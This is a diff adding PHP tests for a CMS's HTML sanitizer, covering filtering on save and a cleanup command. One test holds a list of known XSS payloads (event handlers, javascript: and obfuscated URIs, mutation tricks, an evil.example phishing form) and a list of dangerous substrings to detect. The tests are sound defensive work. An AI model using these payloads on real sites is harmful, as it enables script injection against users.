@@ -1575,6 +1575,161 @@ test('Kernel: the system page, clearing the template cache, create and publish',
     putenv('CAMPANELLA_DB_PREFIX');
 });
 
+echo "\nHTML sanitizer\n";
+
+test('HtmlSanitizer: known XSS tricks are made harmless', function (): void {
+    $sanitizer = new \Campanella\Html\HtmlSanitizer();
+    $attacks = [
+        '<script>alert(1)</script>',
+        '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
+        '<img src=x onerror=alert(1)>',
+        '<IMG SRC="javascript:alert(1)">',
+        '<a href="javascript:alert(1)">x</a>',
+        '<a href="JaVaScRiPt:alert(1)">x</a>',
+        '<a href=" javascript:alert(1)">x</a>',
+        '<a href="java&#x09;script:alert(1)">x</a>',
+        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
+        '<a href="vbscript:msgbox(1)">x</a>',
+        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
+        '<svg onload=alert(1)><script>alert(1)</script></svg>',
+        '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
+        '<iframe src="javascript:alert(1)"></iframe>',
+        '<object data="x.swf"></object><embed src="x.swf">',
+        '<body onload=alert(1)>',
+        '<div style="background:url(javascript:alert(1))">x</div>',
+        '<p style="position:fixed;top:0;left:0;width:100%;height:100%">x</p>',
+        '<style>@import "//evil.example/x.css";</style>',
+        '<link rel=stylesheet href=//evil.example/x.css>',
+        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+        '<form action="//evil.example"><input name=password><button>OK</button></form>',
+        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+        '<template><script>alert(1)</script></template>',
+        '<details open ontoggle=alert(1)>x</details>',
+        '<p onclick="alert(1)" onmouseover="alert(1)">x</p>',
+        '<a href="#" onfocus="alert(1)" autofocus>x</a>',
+        '<base href="javascript:alert(1)//">',
+        '<img src="//evil.example/track.gif">',
+        '<img src="/\evil.example/track.gif">',
+        '<img src="https://evil.example/track.gif">',
+        '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
+        "<scr<script>ipt>alert(1)</script>",
+        '<<script>script>alert(1)<</script>/script>',
+        '<p>a</p><!--<img src=x onerror=alert(1)>-->',
+    ];
+    foreach ($attacks as $attack) {
+        $clean = $sanitizer->sanitize($attack);
+        foreach (['<script', 'javascript:', 'vbscript:', 'data:', ' on', '<iframe', '<object', '<embed', '<svg', '<math', '<style',
+            '<link', '<meta', '<form', '<input', '<base', 'style=', 'evil.example', '<!--'] as $needle) {
+            check(stripos($clean, $needle) === false, "{$attack}  →  {$clean}  (contains {$needle})");
+        }
+        check($sanitizer->sanitize($clean) === $clean, "idempotent: {$attack}");
+    }
+});
+
+test('HtmlSanitizer: the allowed content stays, wrappers are unwrapped, links get rel', function (): void {
+    $sanitizer = new \Campanella\Html\HtmlSanitizer();
+    $kept = '<h2>Cím</h2><p>Egy <strong>félkövér</strong>, <em>dőlt</em> és <s>áthúzott</s> szó, H<sub>2</sub>O, x<sup>2</sup>.</p>'
+        . '<ul><li>egy</li></ul><ol><li>kettő</li></ol><blockquote>idézet</blockquote><pre><code>kód</code></pre><hr />'
+        . '<figure><img src="/media/2026/10/kep.jpg" alt="Kép" width="640" height="480" /><figcaption>Felirat</figcaption></figure>'
+        . '<table><caption>T</caption><thead><tr><th scope="col">A</th></tr></thead><tbody><tr><td colspan="2">1</td></tr></tbody></table>';
+    check($sanitizer->sanitize($kept) === $kept, $sanitizer->sanitize($kept));
+
+    check($sanitizer->sanitize('<div><span style="color:red">Szöveg</span> <font face="Arial">itt</font></div>') === '<div>Szöveg itt</div>', 'wrappers unwrapped, text kept');
+    check($sanitizer->sanitize('<style>body{}</style><title>T</title><p>a</p>') === '<p>a</p>', 'no style or title text');
+    check($sanitizer->sanitize('<p class="x" id="y">a</p>') === '<p>a</p>', 'class and id removed');
+    check($sanitizer->sanitize('<a href="/hirek">a</a>') === '<a href="/hirek" rel="noopener noreferrer">a</a>');
+    check($sanitizer->sanitize('<a href="https://example.com" target="_blank">a</a>') === '<a href="https://example.com" rel="noopener noreferrer">a</a>');
+    check($sanitizer->sanitize('<a href="mailto:info@example.com">a</a>') === '<a href="mailto:info&#64;example.com" rel="noopener noreferrer">a</a>', 'mailto (@ encoded, browsers decode it)');
+    check($sanitizer->sanitize('<p>&lt;b&gt; &amp; ő</p>') === '<p>&lt;b&gt; &amp; ő</p>', 'entities stay escaped');
+    check($sanitizer->sanitize('   ') === '' && $sanitizer->sanitize('csak szöveg') === 'csak szöveg');
+
+    // Configurable: external images, and a narrower element list.
+    $external = new \Campanella\Html\HtmlSanitizer(['external_images' => true]);
+    check(str_contains($external->sanitize('<img src="https://example.com/a.png">'), 'src="https://example.com/a.png"'), 'external images when allowed');
+    $narrow = new \Campanella\Html\HtmlSanitizer(['elements' => ['p' => []]]);
+    check($narrow->sanitize('<p>a <strong>b</strong></p><table><tr><td>c</td></tr></table>') === '<p>a </p>', $narrow->sanitize('<p>a <strong>b</strong></p><table><tr><td>c</td></tr></table>'));
+
+    $short = new \Campanella\Html\HtmlSanitizer(['max_length' => 10]);
+    check($short->isTooLong('<p>12345678</p>') && !$short->isTooLong('<p>1</p>'));
+    throws(\InvalidArgumentException::class, fn () => $short->sanitize('<p>12345678</p>'));
+    throws(\InvalidArgumentException::class, fn () => new \Campanella\Html\HtmlSanitizer(['max_length' => 0]));
+
+    // Problems that are reported instead of filtered: too many tags (slow to parse), invalid UTF-8.
+    check($sanitizer->problem(str_repeat('<div>', 20_001))?->key === 'validation.html_too_many_tags', 'deep nesting is refused');
+    check($sanitizer->problem("<p>a\xc3</p>")?->key === 'validation.invalid_encoding', 'invalid UTF-8 is refused, not emptied');
+    check($sanitizer->problem('<p>rendben</p>') === null);
+
+    // A backtick in an attribute: the library's extra space does not grow on every save.
+    $once = $sanitizer->sanitize('<img alt="`x" src="/a.png">');
+    check($sanitizer->sanitize($once) === $once && !str_contains($once, '&#96;x "'), $once);
+});
+
+test('Saving filters HTML texts; a too long one is a validation error', function () use ($db, $capabilities, $blueprints, $service, $admin): void {
+    $article = $service->create($admin, 'article', ['title' => 'HTML-szűrés', 'body' => '<p onclick="x()">Szöveg</p><script>alert(1)</script>', 'format' => 'html']);
+    check($article->get('body') === '<p>Szöveg</p>', 'filtered on create: ' . $article->get('body'));
+    $stored = $db->fetchValue('SELECT data FROM {objects} WHERE id = :id', ['id' => $article->id()]);
+    check(!str_contains((string) $stored, 'script'), 'the database has the filtered text');
+
+    $service->update($admin, $article, ['body' => '<p>Új</p><img src=x onerror=alert(1)>']);
+    check($article->get('body') === '<p>Új</p><img src="x" />', 'filtered on update: ' . $article->get('body'));
+
+    $plain = $service->create($admin, 'article', ['title' => 'Sima szöveg', 'body' => '<b>marad</b> & így']);
+    check($plain->get('body') === '<b>marad</b> & így', 'plain text is not touched (it is escaped when shown)');
+
+    $short = new ObjectRepository($db, $capabilities, $blueprints, new \Campanella\Html\HtmlSanitizer(['max_length' => 20]));
+    $long = $short->create('article', ['title' => 'Hosszú', 'body' => '<p>' . str_repeat('a', 30) . '</p>', 'format' => 'html']);
+    try {
+        $short->save($long);
+        check(false, 'no exception');
+    } catch (ValidationException $e) {
+        check(isset($e->errors['body']) && $e->errors['body']->key === 'validation.html_too_long', 'too long');
+    }
+    try {
+        $service->create($admin, 'article', ['title' => 'Rossz kódolás', 'body' => "<p>a\xc3</p>", 'format' => 'html']);
+        check(false, 'no exception for invalid UTF-8');
+    } catch (ValidationException $e) {
+        check($e->errors['body']->key === 'validation.invalid_encoding', 'invalid UTF-8 is a validation error');
+    }
+});
+
+test('html:sanitize filters texts stored before the sanitizer', function () use ($db, $service, $admin): void {
+    $article = $service->create($admin, 'article', ['title' => 'Régi HTML', 'body' => '<p>tiszta</p>', 'format' => 'html']);
+    // As if it was stored by 0.0.4, unfiltered.
+    $data = json_decode((string) $db->fetchValue('SELECT data FROM {objects} WHERE id = :id', ['id' => $article->id()]), true);
+    $data['body'] = '<p>régi</p><script>alert(1)</script>';
+    $db->update('objects', ['data' => json_encode($data)], ['id' => $article->id()]);
+
+    putenv('CAMPANELLA_DB_PREFIX=' . $db->prefix());
+    $kernel = new \Campanella\Core\Kernel(dirname(__DIR__));
+    $run = static function (array $args) use ($kernel): array {
+        $stream = fopen('php://memory', 'w+');
+        $code = (new \Campanella\Cli\HtmlSanitizeCommand())->run($kernel->container(), $args, new \Campanella\Cli\Output($stream, $stream));
+        rewind($stream);
+
+        return [$code, (string) stream_get_contents($stream)];
+    };
+    [$code, $out] = $run(['--dry-run']);
+    check($code === 0 && str_contains($out, 'Régi HTML') && str_contains((string) $db->fetchValue('SELECT data FROM {objects} WHERE id = :id', ['id' => $article->id()]), 'script'), 'dry run: listed, not saved');
+    [$code, $out] = $run([]);
+    $data = json_decode((string) $db->fetchValue('SELECT data FROM {objects} WHERE id = :id', ['id' => $article->id()]), true);
+    check($code === 0 && $data['body'] === '<p>régi</p>', 'filtered and saved: ' . $data['body']);
+    [, $out] = $run([]);
+    check(!str_contains($out, 'Régi HTML'), 'nothing left to filter');
+
+    // An object that cannot be saved (here: too many tags) is reported, the rest are still filtered.
+    $broken = $service->create($admin, 'article', ['title' => 'Túl sok címke', 'body' => '<p>x</p>', 'format' => 'html']);
+    $later = $service->create($admin, 'article', ['title' => 'Utána jövő', 'body' => '<p>y</p>', 'format' => 'html']);
+    foreach ([[$broken, str_repeat('<b>', 20_001)], [$later, '<p>y</p><script>z</script>']] as [$object, $body]) {
+        $data = json_decode((string) $db->fetchValue('SELECT data FROM {objects} WHERE id = :id', ['id' => $object->id()]), true);
+        $data['body'] = $body;
+        $db->update('objects', ['data' => json_encode($data)], ['id' => $object->id()]);
+    }
+    [$code, $out] = $run([]);
+    $data = json_decode((string) $db->fetchValue('SELECT data FROM {objects} WHERE id = :id', ['id' => $later->id()]), true);
+    check($code === 1 && str_contains($out, 'Túl sok címke') && $data['body'] === '<p>y</p>', 'skipped one, filtered the next: ' . $out);
+    putenv('CAMPANELLA_DB_PREFIX');
+});
+
 echo "\nDocumentation examples\n";
 
 test('New capability as in the docs example (Weighted)', function () use ($db, $admin): void {
